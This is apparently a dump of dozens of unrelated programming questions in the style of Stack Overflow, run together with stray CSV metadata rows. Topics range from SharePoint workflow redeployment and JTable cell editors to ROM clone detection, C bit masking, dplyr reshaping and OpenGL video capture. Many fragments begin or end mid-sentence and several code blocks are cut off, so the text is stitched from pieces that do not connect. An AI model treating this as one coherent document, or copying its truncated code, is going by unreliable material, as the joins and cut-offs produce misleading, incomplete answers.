  <p>Once the 2nd ‘version’ of the same workflow has been deployed, you’ll need to revisit each document library where you want it to be associated and re-add it as if it were a new workflow.  You’ll have to give it a unique name, like ‘MyWorkflow_v2’.  The other side-effect is that now you’ll have 2 workflow status columns in the document library.  You can remove/hide the first one once all instances of it have completed and the status is no longer needed.</p>
  
  <p>If you redeploy the workflow using the same feature and manifest XML files, then the internal GUID will be the same one as was used in the first deploy.  SharePoint will recognize this as a second ‘version’ of the same workflow and automatically set the first version to the “No New Instances” status.  If however, you choose to use a different GUID in the XML files, then SharePoint will see this as a deployment of a brand new workflow and do nothing with the existing instances. You will need to manually set each instance in each document library to the “No New Instances” setting.</p>
  
  <p>After re-deploying the second ‘version’ of the workflow, you will still need to manually visit each document library where you want it used and add it to the document library.  Keep in mind that its workflow template name will appear in the list of workflow templates as it is named in the XML files (which is OK), but once you add it you’ll be required to enter a unique workflow name for the workflow. This is the point you must choose something like ‘Workflow_v2” as a new name.</p>
  
  <p>The retract action removes all instances of the features within the solution, specifically for my workflow application, it removes all instances of the workflow from all document libraries that it was associated with. However, in the case of <em></em>, where a task is created by the workflow, once the solution is retracted if a user clicks on a task item expecting to get the signature page, they’ll instead get a SharePoint “Unknown error” page.  The reason is because the retract process removed the workflow from the database and there is no longer a workflow associated with the task.</p>

So, rendering issues aside, from what I can tell, the JTable is focusing the component that is returned by the <code>getTableCellEditorComponent</code> method so when you press a key with a cell highlighted it passes focus and the key press to the panel, thinking that's the editor.<br>
Is there anyway I can inform JTable that the ""real"" editor is the JTextfield?
Adding a hacky <code>requestFocusInWindow</code> on the correct component is insufficient as the key press won't get passed on.</p>

During cleanup process, i will manually handle deleting some data based up on some rules and instructs JVM for a GC. Whenever GC occurs, if memory cleans up and reaches 60% of the allocated memory, I need to restart all the Database handling and giving back control to the user. </p>

<p>For checking JVM memory statistics i found following two solutions. Could not able to decide which is best way and why.</p>

<ol>
<li><p>Runtime.freeMemory() - Thread created to run every 10 seconds and check for the free memory and if memory exceeds the limits mentioned, necessary popups will intimate user and will call the methods to halt the operations and freeing up the memory.</p></li>
<li><p>MemoryPoolMXBean.getUsage() - Java 5 has introduced JMX to get the snapshot of the memory at runtime. In, JMX i cannot use Threshold notification since it will only notify when memory reaches/exceeds the given threshhold. Only way to use is Polling in MemoryMXBean and check the memory statistics over a period.</p></li>
</ol>

<p>In case of using polling, it seems for me both the implementations are going to be same.</p>

<p>Please suggest the advantages of the methods and if there are any other alternatives/any corrections to the methods using.</p>

The problem I am trying to solve (having only really developed for Win32) is an issue with the serial port definition.  How does one typically identify differences in platform when there is only supposed to be one executable.

<p>Does one check the platform at runtime for this information?</p>

<p>Perhaps this is a more generic question in that it applies to any platform-specific stuff in mono/.NET.  </p>

<p>How do you handle this?  In some string resource or config file, or hard-coded and switch based on runtime platform?</p>

There is also much zealotry when it comes to unit-testing and I prefer a much more pragmatic approach to coding and life in general. As context, I'm currently writing my first ""real"" application which is the ubiquitous blog engine using asp.net MVC. I'm loosely following the MVC Storefront architecture with my own adjustments. As such, this is my first real foray into mocking objects. I'll put the code example at the end of the question.</p>

<p>I'd appreciate any insight or outside resources that I could use to increase my understanding of the fundamentals of testing and mocking. The resources I've found on the net are typically geared towards the ""how"" of mocking and I need more understanding of the where, why and when of mocking. If this isn't the best place to ask this question, please point me to a better place.</p>

<p>I'm trying to understand the value that I'm getting from the following tests. The UserService is dependent upon the IUserRepository. The value of the service layer is to separate your logic from your data storage, but in this case most of the UserService calls are just passed straight to IUserRepository. The fact that there isn't much actual logic to test could be the source of my concerns as well. I have the following concerns.</p>

<ul>
<li>It feels like the code is just testing that the mocking framework is working. </li>
<li>In order to mock out the dependencies, it makes my tests have too much knowledge of the IUserRepository implementation. Is this a necessary evil? </li>
<li>What value am I actually gaining from these tests? Is the simplicity of the service under test causing me to doubt the value of these tests. </li>

"579981","1","616660","","2009-02-24 00:21:08","","34","9290","<p>I've seen a few questions here related to determining the similarity of files, but they are all linked to a particular domain (images, sounds, text, etc). The techniques offered as solutions require knowledge of the underlying file format of the files being compared. What I am looking for is a method without this requirement, where arbitrary binary files could be compared without needing to understand what type of data they contain. That is, I am looking to determine the <strong>similarity percentage of two files' binary data</strong>.</p>

<p>To give a little more detail for you to work with, even though this is potentially applicable to many things, I do have a specific problem that I'm working on. I also currently have a working solution, but I don't think that it is ideal. There are probably many optimizations in terms of the comparison method, and storing the results. Hopefully some people here will be able to give me some new ideas. I will probably edit in some information about my current method after a couple of days, but I don't want to bias peoples' thoughts about the problem by telling you how I'm already doing it.</p>

<p>The problem I'm working on is <strong>clone detection for video game ROM images</strong>. For those that don't have experience with emulation, ROMs are dumps of the data on game cartridges. A ROM ""clone"" is typically a modified version of the same game, the most common type being a translated version. For example, the Japanese and English versions of the original <em>Final Fantasy</em> for the NES are clones. The games share almost all of their assets (sprites, music, etc), but the text has been translated.</p>

<p>There are currently several groups that work on maintaining lists of clones for the various systems, but as far as I can tell, this is all done manually. What I am attempting to do is find a method to detect similar ROM images automatically and objectively, based on data similarity instead of ""these seem like the same game"". There are several reasons for detecting clones, but one of the major motivations is to be used with <a href=""http://en.wikipedia.org/wiki/Solid_compression"" rel=""noreferrer"">Solid compression</a>. This allows compression of all game clones together into the same archive, with the entire compressed clone set often taking up only slightly more space than one of the individual ROMs.</p>

<p>Some concerns to consider when coming up with potential approaches:</p>

<ul>
<li>ROMs vary highly in size, depending on the system. Some are small, but modern systems may have large ones, 256MB or more. Some (all?) systems only have powers of 2 as possible sizes, a 130MB game on one of these systems would have a 256MB rom, largely empty. Note that because of this, some clones may have wildly different sizes, if a game version crosses the threshold and has to use a cartridge that is twice the size.</li>
<li>There are currently thousands of known ROMs on many systems, with most systems still having new ones released constantly. Even for older systems, there is a major ROM-hacking community that produces modified ROMs often.</li>
<li>Storing similarity data for every possible pair of ROMs would result in millions of rows of data for any of the more popular systems. A system with 5000 ROMs would require 25 million rows of similarity data, with a single new game adding another 5000 rows.</li>
<li>State of the processing must be recoverable, so that if it is interrupted it can pick up where it left off. With any method, a lot of processing will be required, and assuming that the whole thing will run in one batch is not safe.</li>
<li>New ROMs could be added at any time, so the method should not assume that it already has a ""complete"" set. That is, even after you have already figured out similarity for all existing ROMs, if a new one is added (and this could also occur before previous processing was entirely finished) there must be a method for comparing it to all previous ones, to determine which (if any) it is a clone of.</li>

"297678","1","297739","","2008-11-18 02:25:17","","3","9291","<p>I am implementing an asynchronous command pattern for the ""client"" class in a client/server application. I have done some socket coding in the past and I like the new Async pattern that they used in the Socket / SocketAsyncEventArgs classes.</p>

<p>My async method looks like this: <code>public bool ExecuteAsync(Command cmd);</code> It returns true if the execution is pending and false if it completed synchronously. <strong>My question is: Should I always call the callback (cmd.OnCompleted), even in the event of an exception? Or should I throw exceptions right from ExecuteAsync?</strong></p>

<p>Here are some more details if you need them. This is similar to using SocketAsyncEventArgs, but instead of SocketAsyncEventArgs my class is called SomeCmd.</p>

<pre><code>SomeCmd cmd = new SomeCmd(23, 14, 10, ""hike!"");
cmd.OnCompleted += this.SomeCmd_OnCompleted;
this.ConnectionToServer.ExecuteAsync(cmd);
</code></pre>

<p>As with the Socket class, if you need to coordinate with your callback method (SomeCmd_OnCompleted in this case), you can use the return value of ExecuteAsync to know if the operation is pending (true) or if the operation completed synchronously.</p>

<pre><code>SomeCmd cmd = new SomeCmd(23, 14, 10, ""hike!"");
cmd.OnCompleted += this.SomeCmd_OnCompleted;
if( this.ConnectionToServer.ExecuteAsync(cmd) )
{
    Monitor.Wait( this.WillBePulsedBy_SomeCmd_OnCompleted );
}
</code></pre>

<p>Here is a greatly simplified version of my base classes, but you can see how it works:</p>

<pre><code>class Connection
{
    public bool ExecuteAsync(Command cmd)
    {
        /// CONSIDER: If you don't catch every exception here
        /// then every caller of this method must have 2 sets of
                /// exception handling:
        /// One in the handler of Command.OnCompleted and one where ExecuteAsync
        /// is called.
        try
        {
        /// Some possible exceptions here:
        /// 1) remote is disposed. happens when the other side disconnects (WCF).
        /// 2) I do something wrong in TrackCommand (a bug that I want to fix!)
            this.TrackCommand(cmd);
            remote.ServerExecuteAsync( cmd.GetRequest() );
            return true;
        }
        catch(Exception ex)
        {
            /// Command completing synchronously.
            cmd.Completed(ex, true);
            return false;
        }
    }
    /// &lt;summary&gt;This is what gets called by some magic when the server returns a response.&lt;/summary&gt;
    internal CommandExecuteReturn(CommandResponse response)
    {
        Command cmd = this.GetTrackedCommand(response.RequestId);
        /// Command completing asynchronously.
        cmd.Completed(response, false);
    }

    private IServer remote;
}

abstract class Command: EventArgs
{
    internal void Completed(Exception ex, bool synchronously)
    {
        this.Exception = ex;

        this.CompletedSynchronously = synchronously;

        if( this.OnCompleted != null )
        {
            this.OnCompleted(this);
        }
    }

    internal void Completed(CommandResponse response, bool synchronously)
    {
        this.Response = response;
        this.Completed(response.ExceptionFromServer, synchronously)
    }

<p>The HTML 5 draft,  however, contains two specifications in one. First an author spec, describing the elements and attributes that HTML authors should use, and their interrelationships. Validation of an HTML 5 page is based on this spec. The elements and attributes included are not directly drawn from HTML 4, but have needed to be justified from first principles, which means that some HTML 4 features, such as the summary attribute on &lt;table&gt;, longdesc on &lt;img&gt; and the profile attribute on &lt;head&gt;, do not currently appear in this draft. Such features are not considered deprecated, they are simply not included. (Their absence from the draft remains a matter of dispute, although their inclusion any time soon does not seem likely.)</p>

<p>Second, the draft defines a browser processing specification that seeks to define exactly how a browser's parser will treat any byte stream it's given, regardless of how well formed and valid the HTML. This means that when the browsers fully support HTML 5, it will be possible to predict how any browser will treat HTML for a much wider range of inputs than merely those that pass validation.</p>

<p>In particular, because HTML 5 is defined to be 100% backward compatible with today's web, all valid HTML 4, and all invalid but commonly used mark-up, will continue to be processed exactly the same as it is today, regardless of whether it is HTML 5 valid or not.</p>

<p>Therefore, at the very minimum, anyone using any feature from HTML 5, HTML 4, or any previous version of HTML, plus many proprietary extensions, can be confident that their HTML will get consistent and predictable treatment across all browsers.</p>

<p>Given this, does it make any sense to limit ones HTML 5 to that which will validate, and what practical benefit will we get from doing so?</p>

Most of the shared state is set before the thread is started, and never changed. I do have some data that does need to be changed, which I am planning to double-buffer. However, I have a simple boolean for signaling the thread to suspend rendering, and later resume rendering, and another to kill it.

<p>Here's the method provided:</p>

<pre><code>unsigned int getbits(unsigned int x, int p, int n) {
    return (x &gt;&gt; (p + 1 - n)) &amp; ~(~0 &lt;&lt; n);
}
</code></pre>

<p>The idea is that, for the given number <em>x</em>, it will return the <em>n</em> bits starting at position <em>p</em>, counting from the right (with the farthest right bit being position 0). Given the following <code>main()</code> method:</p>

<pre><code>int main(void) {
    int x = 0xF994, p = 4, n = 3;
    int z = getbits(x, p, n);
    printf(""getbits(%u (%x), %d, %d) = %u (%X)\n"", x, x, p, n, z, z);

    return 0;
}
</code></pre>

<p>The output is:</p>

<blockquote>
  <p><code>getbits(63892 (f994), 4, 3) = 5 (5)</code></p>
</blockquote>

<p>I get portions of this, but am having trouble with the ""big picture,"" mostly because of the bits (no pun intended) that I don't understand.</p>

<p>The part I'm specifically having issues with is the complements piece: <code>~(~0 &lt;&lt; n)</code>. I think I get the first part, dealing with <em>x</em>; it's this part (and then the mask) that I'm struggling with -- and how it all comes together to actually retrieve those bits.

<p>I would expect to be able to instantiate a an object of some sort, give it a template along the lines of</p>

<pre><code>Dear ${customer.firstName}. You order will be dispatched on ${order.estimatedDispatchDate}
</code></pre>

<p>provide it with a context which would include a value dictionary of parameter objects (in this case an object of type Customer with a name 'customer', say, and an object of type Order with a name 'order').</p>

<p>I know there are many template frameworks out there - many of which work outside the web application context, but I do not see this as a big heavyweight templating framework. Just a better version of the basic Message Format functionality Java already provides  </p>

<p>For example, I can accomplish the above with java.text.MessageFormat by using a template (or a 'pattern' as they call it) such as</p>

<pre><code>Dear {0}. You order will be dispatched on {1,date,EEE dd MMM yyyy}
</code></pre>

<p>and I can pass it an Object array, in my calling Java program</p>

<pre><code>new Object[] { customer.getFirstName(), order.getEstimatedDispatchDate() };
</code></pre>

<p>However, in this usage, the code and the pattern are intimately linked. While I could put the pattern in a resource properties file, the code and the pattern need to know intimate details about each other. With an EL-like system, the contract between the code and the pattern would be at a much higher level (e.g. customer and order, rather then customer.firstName and order.estimatedDispatchDate), making it easier to change the structure, order and contents of the message without changing any code.</p>

<p>I develop a lot of reports and forms in my office.  I have several web applications providing about 80+ ""live"" reports being generated from various and multiple data sources (Access, SQL, Oracle).  These reports are considered ""live"" because they accept user set paramaters from a form, then query the database to produce a report based on the current information available.</p>

<p>So, the process starts with obtaining the values set by the user, passing those to the database query, receiving the dataset, and finally assigning the dataset to the report.  In some cases, additional fields displayed on the report need to be calculated from the dataset before the report can be generated.  This requires referencing the output controls on the report to assign the calculated value.</p>

<p>While I don't really care to use prefixes in my code for variables or member fields, I do use them to identify the UI controls.  For example, txtFirstName to reference the report control to assign the data from the FirstName field in the dataset to the display control on the report.  Is there a better practice for naming/referencing UI controls on forms and reports?</p>

<p>Key to all these questions is response time.

<p>I want to render a directed graph to a servlet/picture that is displayed in the browser. There should be some kind of optimization of position. No dependency to Swing would be preferred. Algorithms are not important, since the structure of the graph is determined by business logic. It would be desired to be able add labels to edges as well.
it would be optimal if i can serve this as png/svg.</p>

<p>Which library/service would you recommend? </p>

<p>clarifications: </p>

<p>1) The question is all about Graphs - like <a href=""http://en.wikipedia.org/wiki/Directed_acyclic_graph"" rel=""nofollow noreferrer"">Directed Acyclic Graph</a> - NOT - <a href=""http://en.wikipedia.org/wiki/Chart"" rel=""nofollow noreferrer"">Charts</a>.</p>

<p>2) flot, Google Charts - cannot plot graphs, only charts, or have i missed something?</p>

<p>3) no i do not need interactivity</p>

<p>4) graphviz would be nice, but the grappa java library is quite outdated and is built upon swing/awt. while it may be theoretically possible to render swing to images, it would not be my favorite way to to so in a server-app.</p>

<p>5) it would be fine to use an online service where the images are not hosted locally.</p>

However, if I examine this value using <code>typeof()</code>, R tells me that it its data type is 'double'.  Additionally, if I try to bind this to other values and store it in a data frame using <code>c()</code> or <code>cbind()</code>, in the data frame, it winds up being stored as 16434, which looks to me like some sort of different internal storage value of a date.  I'm pretty sure that's what it is too because if I try to convert that value again using <code>as.Date()</code>, it throws an error asking for an origin.</p>

<p>I have experience with <strong>PHP 5</strong>, both with functional and object oriented programming methods. I created a few feature-minimalistic websites.</p>

<p>Professionals may agree about PHP not being a programming language that encourages good development habits. (I believe it's not the task of the tool, but this doesn't matter.) Furthermore, <strong>its performance is also controversial</strong> and often said to be poor compared to competitors.</p>

<p>In the <a href=""http://blog.stackoverflow.com/2009/02/podcast-42/"">42nd podcast at Stack Overflow blog</a> a developer from Poland asked what language he should learn in order to improve his skills. Jeff and Joel suggested that <strong>every one of them would help</strong>, altough there are specific ones that are better in some ways.
Despite they made some great points, it didn't help me that much.</p>

<p>From a beginner point of view, <s>there are not</s> one may not see (correction suggested by <a href=""https://stackoverflow.com/users/10661/s-lott"">S. Lott</a>) many differences between <strong>Perl &amp; Python</strong>. I would like You to emphasize their strenghts and weaknesses and name a few unique services.</p>

<p>Of course, this wouldn't be fair as I could also check both of them. So here's my wishlist and requirements to help You help me.</p>

<p>First of all, I'd like to follow <strong>OOP structures</strong> and use it fundamentally. I partly planned a multiuser <strong>CMS</strong> using MySQL and XML, so the greater the implementations are, the better. Due to its foreseen nature, <strong>string manipulation</strong> will be used intensively.</p>

<p>If there aren't great differences, comparisons should probably mention syntax and other tiny details that don't matter in the first place.</p>

<p>So, here's my question: which one should I try <strong>first</strong> -- Perl || Python?</p>

<hr>

<h2>Conclusion</h2>

<p>Both Perl and Python have their own fans, which is great. I'd like to say I'm grateful for all participation -- there is no trace of any flame war.</p>

<p>I accepted the most valued answer, although there are many great mini-articles below. As suggested more often, I will go with Python first. Then I'll try Perl later on. Let me see which one fits my mind better.</p>

<p>During the development of my special CMS, I'm going to ask more regarding programming doubts -- because developers now can count on each other! Thank you.</p>

<p><strong>Edit:</strong> There were some people suggesting to choose Ruby or Java instead. Java has actually disappointed me. Maybe it has great features, maybe it hasn't. I wouldn't enjoy using it.</p>

<p>In addition, I was told to use Ruby. So far, most of the developers I communicate with have quite bad opinion about Ruby. I'll see it myself, but that's the last element on my priority list.</p>

<p>He points out that well-implemented Asserts store the state, somewhat, of an error condition, e.g.:</p>

<pre><code>Debug.Assert(i &gt; 3, ""i &gt; 3"", ""This means I got a bad parameter"");
</code></pre>

<p>Now, personally, it seems crazy to me that he so loves restating his test without an actual sensible 'business logic' comment, perhaps ""i &lt;= 3 must never happen because of the flobittyjam widgitification process"".</p>

<p>So, I think I get Asserts as a kind-of low-level ""Let's protect my assumptions"" kind of thing... assuming that one feels this is a test one only needs to do in debug - i.e. you are protecting yourself against colleague and future programmers, and hoping that they actually test things.</p>

<p>But what I don't get is, he then goes on to say that you should use assertions in addition to normal error handling; now what I envisage is something like this:</p>

<pre><code>Debug.Assert(i &gt; 3, ""i must be greater than 3 because of the flibbity widgit status"");
if (i &lt;= 3)
{
    throw new ArgumentOutOfRangeException(""i"", ""i must be &gt; 3 because... i="" + i.ToString());
}

<p>What have I gained by the Debug.Assert repetition of the error condition test? I think I'd get it if we were talking about debug-only double-checking of a very important calculation...</p>

<pre><code>double interestAmount = loan.GetInterest();
Debug.Assert(debugInterestDoubleCheck(loan) == interestAmount, ""Mismatch on interest calc"");

<p>A somewhat related question (not worth opening a new thread): is it worth giving <code>IEnumerable&lt;T&gt;</code> as a return type if I'm sure that 99% of the cases I'm going to go .ToList() anyway? What will the performance implications be?</p>

<pre><code>ID | Counter
------------
 0 | 343
 1 | 8344
</code></pre>

<p>Now say that I want to update counter for ID 1,,, what is the easiest way to do it? Do I use sequences? do I simply read the value and update? Is there any special type for it?</p>

<p>I was thinking about using sequence but then I have to create one for each ID (which potentially can be over a 1000. I will also face the problem that I don't know how many sequences I will need so I would have to check if there is a sequence for that ID and etc... and I don't want that.</p>

<p>Assume that the numbers are users belonging to a certain group, then an alternative I was thinking about was to enter a row for each count and when I want to get the number I perform a select group by the id or something and get the numbers of rows.</p>

<p>EDIT: Clarification
I recieve a list of users in a csv that my program handles several times a day (new csv several times a day). Then depending on if the user has has sent a message today (for example) I increment the counter for the group in which this user belongs to. Now at a certain point I want to extract the groups (which can be dynamic, it depends on what I got during the day) and get the number I incremented and reset it.
Hopefully this explains it more :D</p>

<p>Thanks for the help so far, I will experiment :D</p>

We have defined a commonly reused javascript function within application.js, but we also need to be able to generate parts of the function dynamically using groovy code. Unfortunately, ${some groovy code} does not appear to be processed within separate javascript source files.</p>

<p>Is the only way to do this by defining the javascript function within a script tag on a GSP page, or is there a more general solution? Obviously we could define the javascript function in a script tag within a template GSP file which would be reused, but there is a lot of push to keep our javascript functions defined all together in one place (i.e. the external javascript source file). This has performance benefits as well (the javascript source files are usually just downloaded once by each client's browser, instead of reloading the same javascript functions within the source of every html page they visit). I have toyed around with the idea of breaking the function up into static and dynamic pieces, putting the static ones in the external source and putting the dynamic ones in the template GSP, then gluing them together, but this seems like an unnecessary hack.</p>

<p>Any ideas?</p>

<p>(edit: It may sound like the idea of dynamically generating parts of a JavaScript function, which is then downloaded once and used over and over again by the client, would be a bad idea. However, the piece which is ""dynamic"" only changes perhaps once a week or month, and then only very slightly. Mostly we just want this piece generated off the database, even if only once, instead of hard coded.)</p>

<p>Requirements:</p>

<ul>
<li>Separate each word by a dash and remove all punctuation (taking into account not all words are separated by spaces.)</li>
<li>Function takes in a max length, and gets all tokens below that max length. Example: <code>ToSeoFriendly(""hello world hello world"", 14)</code> returns <code>""hello-world""</code></li>
<li>All words are converted to lower case.</li>

<p>On a separate note, should there be a minimum length? </p>

"314580","1","314729","","2008-11-24 16:02:08","","11","9367","<p><b>Executive Summary:</b> When assertion errors are thrown in the threads, the unit test doesn't die. This makes sense, since one thread shouldn't be allowed to crash another thread. The question is how do I either 1) make the whole test fail when the first of the helper threads crashes or 2) loop through and determine the state of each thread after they have all completed (see code below). One way of doing the latter is by having a per thread status variable, e.g., ""boolean[] statuses"" and have ""statuses[i] == false"" mean that the thread failed (this could be extended to capture more information). However, that is not what I want: I want it to fail just like any other unit test when the assertion errors are thrown. Is this even possible? Is it desirable?</p>

<p>I got bored and I decided to spawn a bunch of threads in my unit test and then have them call a service method, just for the heck of it. The code looks approximately like:</p>

<pre><code>Thread[] threads = new Thread[MAX_THREADS];
for( int i = 0; i &lt; threads.length; i++ ) {
    threads[i] = new Thread( new Runnable() {
        private final int ID = threadIdSequenceNumber++;
        public void run() {
            try {
                resultRefs[ID] = runTest( Integer.toString( ID ) ); // returns an object
            }
            catch( Throwable t ) { 
                // this code is EVIL - it catches even
                // Errors - don't copy it - more on this below
                final String message = ""error testing thread with id =&gt; ""
                            + ID;
                logger.debug( message, t );
                throw new IllegalStateException( message, t ); 
                // need to wrap throwable in a 
                // run time exception so it will compile
            }
        }
    } );
}
</code></pre>

<p>After this, we will loop through the array of threads and start each one. After that we will wait for them all to finish. Finally, we will perform some checks on the result references.</p>

<pre><code>for( Thread thread : threads )
    thread.start();

logger.debug( ""waiting for threads to finish ..."" );
boolean done = false;
while( !done ) {
    done = true;
    for( Thread thread : threads )
        if( thread.isAlive() )
            done = false;
}

for( int i = 0; i &lt; resultRefs.length; i++ ) {
    assertTrue( ""you've got the world messed, dawg!"",
            myCondition(resultRefs[i]) );
</code></pre>

<p>Here's the problem. Did you notice that nasty try-catch-throwable block? I just added that as a temporary hack so I could see what was going on. In runTest( String ) a few assertions are made, e.g., assertNotNull( null ), but since it is in a different thread, it doesn't cause the unit test to fail!!!!</p>

<p>My guess is that we will need to somehow iterate over the threads array, check the status of each, and manually cause an assertion error if the thread terminated in a nasty way. What's the name of the method that gives this information (the stack trace of the dead thread).</p>

<p>where VL is a 'Value Length', a DICOM type, and the function itself is generated as a wrapper to a C++ library by SWIG.  It seems that the representation chosen is string, because that can cross managed/unmanaged boundaries relatively easily, but throughout the C++ code in the project (this is GDCM), the char* is simply used as a byte buffer.  So, when you want to set your image buffer pointer, in C++ it's fairly simple, but in C#, I'm stuck with this weird problem.</p>

<p>This is hackeration, and I know that probably the best thing is to make the SWIG library work right.  I really don't know how to do that, and would rather a quick workaround on the C# side, if such exists.</p>

<ol>
<li>Change the <code>$LOCAL</code> &amp; <code>$REMOTE</code> variables to the correct values, assuming <code>$LOCAL</code> &amp; <code>$REMOTE</code> are incorrect.  </li>

<p>Requirements:</p>

<ol>
<li>Content below the sidebar should occupy all of the available width</li>
<li>Content below the sidebar should not wrap when it hits the left of the sidebar</li>
<li>Main content should <em>precede</em> the sidebar in the markup</li>
<li>Sidebar has fixed width but unknown/variable height</li>
<li>CSS-only - no JavaScript solutions</li>
</ol>

<p>This could be achieved without the third requirement: if the sidebar is before the main content in the markup and is within the same containing element, a simple right float does the job. A sidebar before the main content in the markup is not an option here. The sidebar will contain supplemental information and adverts. If this is before the main content in the markup it will be annoying to CSSless browsers and screenreader users (even with 'skip to ...' links).</p>

<p>This could be achieved without the fourth requirement. If the sidebar had a fixed height I could put a containing element before the main content, float it right and give it a suitable width and height and then use absolute positioning to put the sidebar on top of the pre-made space.</p>

<p>Example markup (without CSS, relevant bits only):</p>

<pre><code>&lt;body&gt;
  &lt;div id=""content""&gt;
    &lt;p&gt;
      Lorem ipsum ....
    &lt;/p&gt;
    &lt;p&gt;
      Pellentesque ....
    &lt;/p&gt;
    &lt;div id=""sidebar""&gt;
      /* has some form of fixed width */
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/body&gt;
</code></pre>

<p>Example layout:</p>

<p><a href=""http://webignition.net/images/layoutexample.png"">alt text http://webignition.net/images/layoutexample.png</a></p>

<p>I'm not sure if this is possible. I'm happy to accept an authoritative answer stating that this cannot be achieved. If this can't be achieved I'd appreciate an explanation - knowing why it can't be achieved is much more valuable than just being told it can't.</p>

<p><strong>Update</strong>: I'm happy to see answers that don't meet all of the five requirements, so long as an answer states which requirement is being ignored plus the consequences (pros and cons) of ignoring the requirement. I can then make an informed compromise.</p>

<p><strong>Update 2</strong>: I can't ignore requirement 3 - the sidebar cannot precede the content.</p>

<p>I have a relatively large dataframe (approx 5 million rows) with 2 columns: the first with an individual identifier (<code>id</code>), and a second with a date (<code>date</code>).  At present, each row indicates the occurrence of an action (taken by the individual in the id column) on the date in the date column.  There are about 300,000 unique individuals, and about 2600 unique dates.  For example, the beginning of the data look like this:</p>

<pre><code>    id         date
    John12     2006-08-03
    Tom2993    2008-10-11
    Lisa825    2009-07-03
    Tom2993    2008-06-12
    Andrew13   2007-09-11
</code></pre>

<p>I'd like to reshape the data so that I have a row for every possible <code>id</code> x <code>date</code> pair, with an additional column which counts the total number of events that occurred (perhaps taking the value 0) for the listed individual on the given date.  </p>

<p>I've had some success with the <strong>dplyr</strong> package, which I've used to tabulate the id x date counts which are observed in the data.  </p>

<p>Here's the code I've used to tabulate <code>id</code> x <code>date</code> counts so far: (my dataframe is called <em>df</em>)</p>

<pre><code>reduced = df %.% 
  group_by(id, date) %.%
  summarize(length(date))
</code></pre>

<p>My problem is that (as I said above) I'd like to have a dataset that also includes 0s for id x date pairs that don't have any associated actions.  For example, if there's no observed action for John12 on 2007-10-10, I'd like the output to return a row for that <code>id</code> x <code>date</code> pair, with a count of 0.  </p>

<p>I considered creating the frame above, then mergine with an empty frame, but I'm convinced there must be a simpler solution.  Any suggestions much appreciated!  </p>

<p>When using an anonymous delegate as the WaitCallback, where ThreadPool.QueueUserWorkItem is called in a foreach loop, it appears that the same one foreach-value is passed into each thread.</p>

<pre><code>List&lt; Thing &gt; things = MyDb.GetTheThings();
foreach( Thing t in Things)
{
    localLogger.DebugFormat( ""About to queue thing [{0}]."", t.Id );
    ThreadPool.QueueUserWorkItem(
        delegate()
        {
            try
            {
                WorkWithOneThing( t );
            }
            finally
            {
                Cleanup();
                localLogger.DebugFormat(""Thing [{0}] has been queued and run by the delegate."", t.Id ); 
            }
        });
 }
</code></pre>

<p>For a collection of 16 Thing instances in Things I observed that each 'Thing' passed to WorkWithOneThing corresponded to the last item in the 'things' list.</p>

<p>I suspect this is because the delegate is accessing the 't' outer variable.  Note that I also experimented with passing the Thing as a parameter to the anonymous delegate, but the behavior remained incorrect.</p>

<p>When I re-factored the code to use a named WaitCallback method and passed the Thing 't' to the method, voilà ... the i'th instance of Things was correctly passed into WorkWithOneThing.</p>

<p>A lesson in parallelism I guess.  I also imagine that the Parallel.For family addresses this, but that library was not an option for us at this point.</p>

<p>Hope this saves someone else some time.</p>

"154730","1","154809","","2008-09-30 20:03:16","","11","9397","<p>I am supposed to provide my users a really simple way of capturing video clips out of my OpenGL application's main window. I am thinking of adding buttons and/or keyboard shortcuts for starting and stopping the capture; when starting, I could ask for a filename and other options, if any. It has to run in Windows (XP/Vista), but I also wouldn't like to close the Linux door which I've so far been able to keep open.</p>

<p>The application uses OpenGL fragment and shader programs, the effects due to which I absolutely need to have in the eventual videos.</p>

<p>It looks to me like there might be even several different approaches that could potentially fulfill my requirements (but I don't really know where I should start):</p>

<ul>
<li><p>An encoding library with functions like startRecording(filename), stopRecording, and captureFrame. I could call captureFrame() after every frame rendered (or every second/third/whatever). If doing so makes my program run slower, it's not really a problem.</p></li>
<li><p>A standalone external program that can be programmatically controlled from my application. After all, a standalone program that can <em>not</em> be controlled almost does what I need... But as said, it should be really simple for the users to operate, and I would appreciate seamlessness as well; my application typically runs full-screen. Additionally, it should be possible to distribute as part of the installation package for my application, which I currently prepare using NSIS.</p></li>
<li><p>Use the Windows API to capture screenshots frame-by-frame, then employ (for example) one of the <a href=""https://stackoverflow.com/questions/93954/how-to-programatically-create-videos"">libraries mentioned here</a>. It seems to be easy enough to find examples of how to capture screenshots in Windows; however, I would love a solution which doesn't really force me to get my hands super-dirty on the WinAPI level.</p></li>
<li><p>Use OpenGL to render into an offscreen target, then use a library to produce the video. I don't know if this is even possible, and I'm afraid it might not be the path of least pain anyway. In particular, I would not like the actual rendering to take a different execution path depending on whether video is being captured or not. Additionally, I would avoid anything that might decrease the frame rate in the normal, non-capture mode.</p></li>
</ul>

<p>If the solution were free in either sense of the word, then that would be great, but it's not really an absolute requirement. In general, the less bloat there is, the better. On the other hand, for reasons beyond this question, I cannot link in any GPL-only code, unfortunately.</p>

<p>Regarding the file format, I cannot expect my users to start googling for any codecs, but as long as also <em>displaying</em> the videos is easy enough for a basic-level Windows user, I don't really care what the format is. However, it would be great if it were possible to control the compression quality of the output.</p>

<p>Just to clarify: I <em>don't</em> need to capture video from an external device like camcorder, nor am I really interested in mouse movements, even though getting them does not harm either. There are no requirements regarding audio; the application makes no noise whatsoever.</p>

<p>I write C++ using Visual Studio 2008, for this very application also taking benefit of GLUT and GLUI. I have a solid understanding regarding C++ and linking in libraries and that sort of stuff, but on the other hand OpenGL is quite new for me: so far, I've really only learnt the necessary bits to actually get my job done.</p>

<p>I don't need a solution super-urgently, so feel free to take your time :)</p>

<p>On project Foo I have the following configuration:</p>

<ul>
<li>Checked ""Aggregate downstream test results"".</li>
<li>Checked ""Automatically aggregate all downstream tests"" under the previous option.</li>
<li>Checked ""Build other projects"" and specified ""Foo-Tests"" to build.</li>
</ul>

<p>On project Foo-Tests I have the following configuration:</p>

<ul>
<li>Checked ""Publish JUnit test result report"" and specified my JUnit report XML files.</li>
</ul>

<p>When Foo builds, it builds successfully and correctly triggers a Foo-Tests build. The Foo-Tests build is successful and publishes the JUnit reports correctly. However, when I look for the aggregated test results in Foo, there's a ""Latest Test Result (no tests)"" link for the build which sends me to a 404.</p>

<p>Here's what I've tried that doesn't solve the problem:</p>

<ul>
<li>Tell Foo to ""Publish JUnit test result report"" with no parameters (there are no tests in project Foo, just Foo-Tests). This caused an error since there were no test files for it to process within the project.</li>
